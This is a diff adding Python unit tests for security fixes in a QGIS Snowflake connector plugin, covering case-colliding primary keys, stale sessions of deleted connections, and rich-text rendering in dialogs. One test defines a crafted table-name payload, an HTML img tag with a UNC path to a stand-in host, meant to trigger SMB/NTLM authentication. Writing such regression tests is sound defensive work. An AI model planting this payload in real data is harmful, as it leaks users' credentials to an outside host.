@@ -2567,5 +2567,472 @@ class TestImportDecimalCoercion(unittest.TestCase):
         self.assertIn("float(val)", flat)
 
 
+class TestCaseCollidingPrimaryKey(unittest.TestCase):
+    """SNOW-4134145 / CWE-178: the declared-primary-key shortcut in
+    _validate_primary_key must compare identifiers case-sensitively.
+
+    Snowflake treats ``ID`` (unquoted -> folds to ``ID``) and ``"id"`` (quoted
+    -> stays ``id``) as two distinct columns. The old shortcut compared them
+    after a blanket ``.upper()`` fold, so a project author could persist
+    ``primary_key=ID`` in a shared .qgs/.qgz that case-collides with a table's
+    real quoted ``"id"`` key. That false match skipped the duplicate scan of
+    the URI-selected column, wrongly advertised UPDATE/DELETE capability on a
+    non-unique column, and turned one edit into silent mass DML.
+    """
+
+    def _load_sql(self):
+        import importlib.util
+
+        spec = importlib.util.spec_from_file_location(
+            "helpers.sql", ROOT / "helpers" / "sql.py"
+        )
+        mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(mod)
+        return mod
+
+    def test_identifiers_equal_exists(self):
+        mod = self._load_sql()
+        self.assertTrue(
+            hasattr(mod, "identifiers_equal"),
+            "helpers/sql.py must expose identifiers_equal for a case-sensitive "
+            "primary-key identity check",
+        )
+
+    def test_identifiers_equal_matches_exact_case(self):
+        mod = self._load_sql()
+        self.assertTrue(mod.identifiers_equal("ID", "ID"))
+        self.assertTrue(mod.identifiers_equal("id", "id"))
+        self.assertTrue(mod.identifiers_equal("GEOM_ID", "GEOM_ID"))
+
+    def test_identifiers_equal_rejects_case_collision(self):
+        """Case-only differences are DISTINCT columns and must not match."""
+        mod = self._load_sql()
+        self.assertTrue("id".upper() == "ID".upper())
+        self.assertFalse(mod.identifiers_equal("id", "ID"))
+        self.assertFalse(mod.identifiers_equal("ID", "id"))
+        self.assertFalse(mod.identifiers_equal("Id", "ID"))
+
+    def test_identifiers_equal_none_safe(self):
+        mod = self._load_sql()
+        self.assertFalse(mod.identifiers_equal(None, "ID"))
+        self.assertFalse(mod.identifiers_equal("ID", None))
+        self.assertFalse(mod.identifiers_equal(None, None))
+
+    def test_validate_primary_key_uses_case_sensitive_compare(self):
+        content = (ROOT / "providers" / "sf_vector_data_provider.py").read_text(
+            encoding="utf-8"
+        )
+        idx = content.index("def _validate_primary_key(self)")
+        next_def = content.index("\n    def ", idx + 1)
+        body = content[idx:next_def]
+        self.assertNotIn(
+            "self._primary_key.upper()",
+            body,
+            "the case-insensitive .upper() primary-key comparison must be "
+            "removed (SNOW-4134145 / CWE-178)",
+        )
+        self.assertIn("identifiers_equal(declared, self._primary_key)", body)
+        self.assertIn("identifiers_equal", content)
+
+
+def _load_connection_manager(testcase, present_connections):
+    """Load managers/sf_connection_manager.py against self-contained stubs."""
+    import sys
+    import types
+    import importlib.util
+
+    names = (
+        "snowflake",
+        "snowflake.connector",
+        "snowflake.connector.cursor",
+        "qgis",
+        "qgis.core",
+        "qgis_snowflake_connector",
+        "qgis_snowflake_connector.managers",
+        "qgis_snowflake_connector.managers.sf_connection_manager",
+        "qgis_snowflake_connector.helpers",
+        "qgis_snowflake_connector.helpers.utils",
+        "qgis_snowflake_connector.helpers.sql",
+    )
+    saved = {n: sys.modules.get(n) for n in names}
+
+    def _restore():
+        for n, prev in saved.items():
+            if prev is None:
+                sys.modules.pop(n, None)
+            else:
+                sys.modules[n] = prev
+
+    testcase.addCleanup(_restore)
+
+    snowflake = types.ModuleType("snowflake")
+    connector = types.ModuleType("snowflake.connector")
+    connector.SnowflakeConnection = type("SnowflakeConnection", (), {})
+
+    def _stub_connect(**_kwargs):
+        raise RuntimeError("stub snowflake.connector.connect must not be reached")
+
+    connector.connect = _stub_connect
+    cursor_mod = types.ModuleType("snowflake.connector.cursor")
+    cursor_mod.SnowflakeCursor = type("SnowflakeCursor", (), {})
+    connector.cursor = cursor_mod
+    snowflake.connector = connector
+
+    qgis = types.ModuleType("qgis")
+    core = types.ModuleType("qgis.core")
+    core.Qgis = type(
+        "Qgis", (), {"MessageLevel": type("ML", (), {"Critical": 0, "Warning": 1})}
+    )
+    core.QgsMessageLog = type(
+        "QgsMessageLog", (), {"logMessage": staticmethod(lambda *a, **k: None)}
+    )
+    qgis.core = core
+
+    plugin_pkg = types.ModuleType("qgis_snowflake_connector")
+    plugin_pkg.__path__ = [str(ROOT)]
+    managers_pkg = types.ModuleType("qgis_snowflake_connector.managers")
+    managers_pkg.__path__ = [str(ROOT / "managers")]
+    helpers_pkg = types.ModuleType("qgis_snowflake_connector.helpers")
+    helpers_pkg.__path__ = [str(ROOT / "helpers")]
+    helpers_utils = types.ModuleType("qgis_snowflake_connector.helpers.utils")
+    helpers_utils.get_auth_information = lambda name: {}
+    helpers_utils.connection_settings_exist = (
+        lambda name: name in present_connections
+    )
+    helpers_sql = types.ModuleType("qgis_snowflake_connector.helpers.sql")
+    helpers_sql.quote_identifier = lambda n: n
+
+    for mod in (
+        snowflake,
+        connector,
+        cursor_mod,
+        qgis,
+        core,
+        plugin_pkg,
+        managers_pkg,
+        helpers_pkg,
+        helpers_utils,
+        helpers_sql,
+    ):
+        sys.modules[mod.__name__] = mod
+
+    spec = importlib.util.spec_from_file_location(
+        "qgis_snowflake_connector.managers.sf_connection_manager",
+        ROOT / "managers" / "sf_connection_manager.py",
+    )
+    module = importlib.util.module_from_spec(spec)
+    sys.modules[spec.name] = module
+    spec.loader.exec_module(module)
+    return module
+
+
+class TestDeletedConnectionSessionExpiration(unittest.TestCase):
+    """SNOW-4134146 / CWE-613: a deleted connection must not remain usable
+    through a surviving project handle and keep-alive Snowflake session.
+    """
+
+    class _FakeConn:
+        def __init__(self):
+            self.closed = False
+
+        def close(self):
+            self.closed = True
+
+    def test_get_connection_purges_stale_session_when_settings_deleted(self):
+        mod = _load_connection_manager(self, present_connections={"live_conn"})
+        mgr = mod.SFConnectionManager.get_instance()
+        mgr.opened_connections = {}
+        mgr._active_schemas = {}
+        mgr._active_query_tags = {}
+
+        live = self._FakeConn()
+        deleted = self._FakeConn()
+        mgr.opened_connections["live_conn"] = live
+        mgr.opened_connections["deleted_conn"] = deleted
+        mgr._active_schemas["deleted_conn"] = "PUBLIC"
+        mgr._active_query_tags["deleted_conn"] = "tag"
+
+        self.assertIs(mgr.get_connection("live_conn"), live)
+        self.assertFalse(live.closed)
+
+        self.assertIsNone(
+            mgr.get_connection("deleted_conn"),
+            "get_connection() returned a session for a deleted connection; a "
+            "keep-alive session must expire when its settings are removed "
+            "(CWE-613).",
+        )
+        self.assertNotIn("deleted_conn", mgr.opened_connections)
+        self.assertTrue(deleted.closed)
+        self.assertNotIn("deleted_conn", mgr._active_schemas)
+        self.assertNotIn("deleted_conn", mgr._active_query_tags)
+
+    class _FakeCursorConn:
+        def __init__(self):
+            self.closed = False
+            self.expired = False
+            self.cursor_calls = 0
+
+        def cursor(self):
+            self.cursor_calls += 1
+            return object()
+
+        def close(self):
+            self.closed = True
+
+    def test_create_cursor_purges_and_refuses_deleted_connection(self):
+        """execute_query reaches a session via create_cursor, so the stale
+        session guard must also fire here (CWE-613)."""
+        mod = _load_connection_manager(self, present_connections={"live_conn"})
+        mgr = mod.SFConnectionManager.get_instance()
+        mgr.opened_connections = {}
+        mgr._active_schemas = {}
+        mgr._active_query_tags = {}
+
+        deleted = self._FakeCursorConn()
+        mgr.opened_connections["deleted_conn"] = deleted
+        mgr._active_schemas["deleted_conn"] = "PUBLIC"
+        mgr._active_query_tags["deleted_conn"] = "tag"
+
+        with self.assertRaises(Exception):
+            mgr.create_cursor("deleted_conn")
+
+        self.assertNotIn("deleted_conn", mgr.opened_connections)
+        self.assertTrue(deleted.closed)
+        self.assertNotIn("deleted_conn", mgr._active_schemas)
+        self.assertNotIn("deleted_conn", mgr._active_query_tags)
+
+    def test_create_cursor_returns_cursor_for_live_connection(self):
+        mod = _load_connection_manager(self, present_connections={"live_conn"})
+        mgr = mod.SFConnectionManager.get_instance()
+        mgr.opened_connections = {}
+        mgr._active_schemas = {}
+        mgr._active_query_tags = {}
+
+        live = self._FakeCursorConn()
+        mgr.opened_connections["live_conn"] = live
+
+        self.assertIsNotNone(mgr.create_cursor("live_conn"))
+        self.assertEqual(live.cursor_calls, 1)
+        self.assertFalse(live.closed)
+        self.assertIn("live_conn", mgr.opened_connections)
+
+    def test_get_connection_source_checks_settings_existence(self):
+        content = (ROOT / "managers" / "sf_connection_manager.py").read_text(
+            encoding="utf-8"
+        )
+        self.assertIn("connection_settings_exist", content)
+        self.assertIn("def purge_connection(", content)
+
+    def test_create_cursor_source_checks_settings_existence(self):
+        content = (ROOT / "managers" / "sf_connection_manager.py").read_text(
+            encoding="utf-8"
+        )
+        idx = content.index("def create_cursor(")
+        next_def = content.index("\n    def ", idx + 1)
+        body = content[idx:next_def]
+        self.assertIn("connection_settings_exist", body)
+        self.assertIn("purge_connection", body)
+
+    def test_remove_connection_purges_manager_session(self):
+        content = (ROOT / "helpers" / "utils.py").read_text(encoding="utf-8")
+        idx = content.index("def remove_connection(")
+        next_def = content.index("\ndef connection_settings_exist(", idx)
+        body = content[idx:next_def]
+        self.assertIn("purge_connection", body)
+
+    def test_remove_connection_removes_auth_configs_before_settings_delete(self):
+        """The layer_authcfg id and credential config_id must be read before
+        the settings group is wiped and then deleted from the auth manager, so
+        a surviving project authcfg= token can no longer re-authenticate as the
+        deleted alias (CWE-613)."""
+        content = (ROOT / "helpers" / "utils.py").read_text(encoding="utf-8")
+        idx = content.index("def remove_connection(")
+        next_def = content.index("\ndef connection_settings_exist(", idx)
+        body = content[idx:next_def]
+
+        self.assertIn("removeAuthenticationConfig", body)
+        self.assertIn("_LAYER_AUTHCFG_MAP_KEY", body)
+
+        # The ids must be captured before the group is removed, otherwise there
+        # is nothing left to delete from the auth manager.
+        read_idx = body.index("_LAYER_AUTHCFG_MAP_KEY")
+        remove_idx = body.index('settings.remove("")')
+        self.assertLess(
+            read_idx,
+            remove_idx,
+            "auth-config ids must be read before the settings group is removed",
+        )
+
+
+class TestForcedSMBDataSourceManagerWidget(unittest.TestCase):
+    """SNOW-4134147 / CWE-116: Data Source Manager dialogs must force PlainText
+    so crafted catalog identifiers cannot trigger SMB/NTLM via rich text.
+    """
+
+    WIDGET = ROOT / "dialogs" / "sf_data_source_manager_widget.py"
+    PAYLOAD = 'SELECT count(*) FROM "<img src=\\\\alice.example\\share\\p>"'
+
+    def _widget_source(self):
+        return self.WIDGET.read_text(encoding="utf-8")
+
+    def test_qt_imported_for_textformat(self):
+        content = self._widget_source()
+        self.assertRegex(
+            content,
+            r"from qgis\.PyQt\.QtCore import [^\n]*\bQt\b",
+            "Qt must be imported from qgis.PyQt.QtCore",
+        )
+
+    def test_no_autotext_information_boxes_remain(self):
+        content = self._widget_source()
+        self.assertNotIn(
+            "QMessageBox.information(",
+            content,
+            "AutoText QMessageBox.information() must be replaced by a "
+            "PlainText-forcing helper",
+        )
+
+    def test_double_click_handler_does_not_use_autotext(self):
+        content = self._widget_source()
+        idx = content.index("def on_m_tables_tree_view_double_clicked(")
+        end = content.index("\n    def ", idx + 1)
+        body = content[idx:end]
+        self.assertNotIn("QMessageBox.information(", body)
+
+    def test_widget_forces_plain_text(self):
+        content = self._widget_source()
+        self.assertIn("setTextFormat(Qt.TextFormat.PlainText)", content)
+
+    def test_stale_catalog_generation_guard_present(self):
+        content = self._widget_source()
+        self.assertIn("_catalog_generation", content)
+        self.assertIn("_on_connection_selection_changed", content)
+        self.assertIn("catalog_generation != self._catalog_generation", content)
+        connect_task = (ROOT / "tasks" / "sf_connect_task.py").read_text(
+            encoding="utf-8"
+        )
+        self.assertIn("on_data_ready = pyqtSignal(str, int, list)", connect_task)
+
+    def test_connect_does_not_trust_catalog_before_response(self):
+        """on_btn_connect_clicked must not pre-set _catalog_connection, or a
+        double-click on the previous connection's still-visible rows would pass
+        the stale-selection guard (SNOW-4134147)."""
+        content = self._widget_source()
+        idx = content.index("def on_btn_connect_clicked(")
+        end = content.index("\n    def ", idx + 1)
+        body = content[idx:end]
+        self.assertIn("self._catalog_connection = None", body)
+        self.assertNotIn("self._catalog_connection = selected_connection", body)
+
+    def test_data_ready_sets_catalog_connection_after_checks(self):
+        content = self._widget_source()
+        idx = content.index("def on_data_ready(")
+        end = content.index("\n    def ", idx + 1)
+        body = content[idx:end]
+        guard_idx = body.index("catalog_generation != self._catalog_generation")
+        set_idx = body.index("self._catalog_connection = connection_name")
+        self.assertLess(
+            guard_idx,
+            set_idx,
+            "_catalog_connection must only be set after the generation/alias "
+            "checks pass",
+        )
+
+    def test_connection_change_ignores_combo_rebuild(self):
+        """currentIndexChanged also fires while the combo is cleared/rebuilt;
+        re-selecting the same alias must not bump the generation and wipe a
+        valid tree (SNOW-4134147)."""
+        content = self._widget_source()
+        idx = content.index("def _on_connection_selection_changed(")
+        end = content.index("\n    def ", idx + 1)
+        body = content[idx:end]
+        self.assertIn("== self._catalog_connection", body)
+        guard_idx = body.index("== self._catalog_connection")
+        bump_idx = body.index("self._catalog_generation += 1")
+        self.assertLess(
+            guard_idx,
+            bump_idx,
+            "the same-alias/empty guard must short-circuit before the "
+            "generation is bumped",
+        )
+
+    def _extract_show_information(self):
+        import ast
+
+        src = self._widget_source()
+        tree = ast.parse(src)
+        for node in ast.walk(tree):
+            if isinstance(node, ast.ClassDef) and node.name.startswith(
+                "SFDataSourceManagerWidget"
+            ):
+                for item in node.body:
+                    if (
+                        isinstance(item, ast.FunctionDef)
+                        and item.name == "_show_information"
+                    ):
+                        return ast.get_source_segment(src, item)
+        return None
+
+    def test_show_information_helper_renders_payload_as_plain_text(self):
+        import textwrap
+
+        func_src = self._extract_show_information()
+        self.assertIsNotNone(
+            func_src,
+            "SFDataSourceManagerWidget must expose a _show_information helper "
+            "that forces plain text",
+        )
+
+        recorded = {}
+
+        class _FakeIcon:
+            Information = "information"
+
+        class _FakeTextFormat:
+            PlainText = "PlainText"
+            RichText = "RichText"
+            AutoText = "AutoText"
+
+        class _FakeQt:
+            TextFormat = _FakeTextFormat
+
+        class _FakeMessageBox:
+            Icon = _FakeIcon
+
+            def __init__(self, parent=None):
+                recorded["created"] = True
+                recorded["text_format"] = None
+
+            def setIcon(self, icon):
+                recorded["icon"] = icon
+
+            def setWindowTitle(self, title):
+                recorded["title"] = title
+
+            def setTextFormat(self, fmt):
+                recorded["text_format"] = fmt
+
+            def setText(self, text):
+                recorded["text"] = text
+
+            def exec(self):
+                recorded["exec"] = True
+
+        namespace = {"QMessageBox": _FakeMessageBox, "Qt": _FakeQt}
+        exec(textwrap.dedent(func_src), namespace)
+        helper = namespace["_show_information"]
+        helper(object(), "Double-clicked on Table", self.PAYLOAD)
+
+        self.assertTrue(recorded.get("exec"), "the dialog must be shown")
+        self.assertEqual(
+            recorded.get("text_format"),
+            _FakeTextFormat.PlainText,
+            "the helper must force Qt.TextFormat.PlainText",
+        )
+        self.assertEqual(recorded.get("text"), self.PAYLOAD)
+        self.assertNotEqual(recorded.get("text_format"), _FakeTextFormat.AutoText)
+        self.assertNotEqual(recorded.get("text_format"), _FakeTextFormat.RichText)
+
+
 if __name__ == "__main__":
     unittest.main()
